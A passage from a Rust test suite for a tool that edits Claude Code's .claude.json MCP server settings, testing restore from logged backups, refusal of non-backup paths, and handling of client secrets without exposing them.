        loop {
            if let Some(pid) = std::fs::read_to_string(file)
                .ok()
                .and_then(|s| s.parse().ok())
            {
                return pid;
            }
            assert!(Instant::now() < until, "claude never started");
            std::thread::sleep(Duration::from_millis(20));
        }
    }

    fn gone_soon(pid: u32) -> bool {
        let until = Instant::now() + WAIT;
        while Instant::now() < until {
            if !crate::cli::testutil::pid_alive(pid) {
                return true;
            }
            std::thread::sleep(Duration::from_millis(50));
        }
        false
    }

    // ---- restoring from a backup in the activity log

    fn applied(core: &Core, plan: &PlanView) -> Vec<Event> {
        core.send(Command::Apply(plan.id));
        let events = collect(core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::Applied { .. } | Event::ApplyFailed { .. }))
        });
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::Applied { changed: true, .. })),
            "{events:#?}"
        );
        events
    }

    /// The `.claude.json` backup of the newest change in the activity log, as the page lists it.
    fn newest_backup(core: &Core) -> String {
        let log = activity(core);
        log.entries[0].backups[0].path.clone()
    }

    #[test]
    fn a_restore_puts_back_a_deleted_server_and_leaves_the_rest_of_the_file_alone() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(&core, vec![Change::Delete { id: user_id("gw") }]);
        applied(&core, &plan);
        let backup = newest_backup(&core);
        // Since then Claude Code went on: it counted a start, and a server was added.
        let mut config = config_json(&env);
        config["numStartups"] = serde_json::json!(9);
        config["mcpServers"]["newer"] = serde_json::json!({"type": "stdio", "command": "n"});
        write_config(&env, &config);
        let plan = plan_for(&core, vec![Change::Restore { backup }]);
        assert_eq!(plan.action, "Restore");
        assert!(!plan.nothing_to_do);
        assert!(
            plan.summary
                .contains(&"Put back gw for the user".to_owned()),
            "{plan:#?}"
        );
        assert!(
            plan.summary.iter().any(|s| s.contains("newer")),
            "what was added since is named: {plan:#?}"
        );
        // The review never shows a server's settings.
        assert!(!format!("{plan:?}").contains("s3cret-value"));
        let events = applied(&core, &plan);
        let config = config_json(&env);
        assert_eq!(
            config["mcpServers"]["gw"],
            two_projects("end")["mcpServers"]["gw"],
            "back, secret and all"
        );
        assert_eq!(
            config["mcpServers"]["newer"]["command"], "n",
            "a restore removes nothing"
        );
        assert_eq!(config["numStartups"], 9, "Claude Code's own settings stay");
        assert!(
            snapshots(&events)
                .last()
                .unwrap()
                .servers
                .iter()
                .any(|r| r.name == "gw")
        );
        // The restore is logged with the backup it took first, so it can be undone the same way.
        let log = activity(&core);
        assert_eq!(log.entries.len(), 2, "{log:#?}");
        assert_eq!(log.entries[0].summary, plan.summary);
        let before = &log.entries[0].backups[0];
        assert!(before.kept);
        let undo = plan_for(
            &core,
            vec![Change::Restore {
                backup: before.path.clone(),
            }],
        );
        assert!(undo.summary.iter().any(|s| s.contains("gw")), "{undo:#?}");
    }

    #[test]
    fn a_restore_puts_back_one_server_and_changes_another_back_in_the_same_list() {
        // Found trying it in the real app: the save refused to add a server and change another in one list.
        let mut config = two_projects("end");
        config["mcpServers"]["tool"] = serde_json::json!({"type": "stdio", "command": "t1"});
        config["projects"]["/work/a"]["mcpServers"]["second"] =
            serde_json::json!({"type": "stdio", "command": "s1"});
        let env = quiet_env(&config);
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        applied(&core, &plan);
        let backup = newest_backup(&core);
        let mut now = config_json(&env);
        now["mcpServers"].as_object_mut().unwrap().remove("gw");
        now["mcpServers"]["tool"]["command"] = serde_json::json!("t2");
        now["projects"]["/work/a"]["mcpServers"]
            .as_object_mut()
            .unwrap()
            .remove("loc");
        now["projects"]["/work/a"]["mcpServers"]["second"]["command"] = serde_json::json!("s2");
        write_config(&env, &now);
        let plan = plan_for(&core, vec![Change::Restore { backup }]);
        applied(&core, &plan);
        let after = config_json(&env);
        assert_eq!(after["mcpServers"], config["mcpServers"]);
        assert_eq!(
            after["projects"]["/work/a"]["mcpServers"]["loc"],
            config["projects"]["/work/a"]["mcpServers"]["loc"]
        );
        assert_eq!(
            after["projects"]["/work/a"]["mcpServers"]["second"]["command"],
            "s1"
        );
    }

    #[test]
    fn restoring_what_is_already_there_writes_nothing() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        applied(&core, &plan);
        let backup = newest_backup(&core);
        let plan = plan_for(&core, vec![Change::Restore { backup }]);
        assert_eq!(
            plan.summary[1..],
            ["Turn on loc in a".to_owned()],
            "{plan:#?}"
        );
        applied(&core, &plan);
        assert_eq!(disabled_list(&env, "/work/a"), serde_json::json!([]));
        // The backup taken before the restore matches the file before it: restoring it again is the undo; restoring
        // the first one again does nothing.
        let first = activity(&core).entries[1].backups[0].path.clone();
        let again = plan_for(&core, vec![Change::Restore { backup: first }]);
        assert!(again.nothing_to_do, "{again:#?}");
    }

    #[test]
    fn a_restore_is_refused_for_anything_but_a_kept_backup_of_claude_json() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        for backup in [
            "../cfg/.claude.json".to_owned(),
            env.dir
                .path()
                .join("cfg")
                .join(".claude.json")
                .display()
                .to_string(),
            "claude.json.0001760000000000-0.bak".to_owned(),
        ] {
            let why = plan_failure(&core, vec![Change::Restore { backup }]);
            assert!(!why.is_empty());
        }
        let why = plan_failure(
            &core,
            vec![
                Change::Restore {
                    backup: "claude.json.0001760000000000-0.bak".to_owned(),
                },
                Change::Delete { id: user_id("gw") },
            ],
        );
        assert!(why.contains("on its own"), "{why}");
        assert!(config_json(&env)["mcpServers"].get("gw").is_some());
    }

    #[test]
    fn a_restore_puts_back_a_server_that_signs_in_with_its_kept_client_secret() {
        let (env, store, _key, _repo) = oauth_move_env(
            r#"{"rules":[{"args":["mcp","add-json"],"delay_ms":600,"stdout_file":"added.txt"}]}"#,
        );
        std::fs::write(
            env.dir.path().join("added.txt"),
            "Added http MCP server sso to user config\n",
        )
        .unwrap();
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        // A plain change, for a backup that has sso; then sso is removed (by Claude Code, say).
        let mut config = config_json(&env);
        config["mcpServers"]["plain"] = serde_json::json!({"type": "stdio", "command": "p"});
        write_config(&env, &config);
        let plan = plan_for(
            &core,
            vec![Change::Delete {
                id: user_id("plain"),
            }],
        );
        applied(&core, &plan);
        let backup = newest_backup(&core);
        let mut config = config_json(&env);
        config["mcpServers"].as_object_mut().unwrap().remove("sso");
        write_config(&env, &config);
        let plan = plan_for(&core, vec![Change::Restore { backup }]);
        assert!(
            plan.summary
                .contains(&"Put back sso for the user".to_owned()),
            "{plan:#?}"
        );
        let runs = env.changes_run().len();
        core.send(Command::Apply(plan.id));
        env.wait_for_run(runs + 1);
        let mut config = config_json(&env);
        config["mcpServers"]["sso"] = serde_json::from_str(SSO_ENTRY).unwrap();
        write_config(&env, &config);
        let events = collect(&core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::Applied { .. } | Event::ApplyFailed { .. }))
        });
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::Applied { changed: true, .. })),
            "{events:#?}"
        );
        let run = &env.changes_run()[runs];
        assert_eq!(
            run.0[..5],
            ["mcp", "add-json", "-s", "user", "--client-secret"]
        );
        assert!(!run.0.iter().any(|a| a.contains(CLIENT_SECRET)));
        assert_eq!(run.2.as_deref(), Some(sha256(CLIENT_SECRET).as_str()));
        assert!(
            config_json(&env)["mcpServers"].get("plain").is_some(),
            "plain is back too"
        );
    }
}
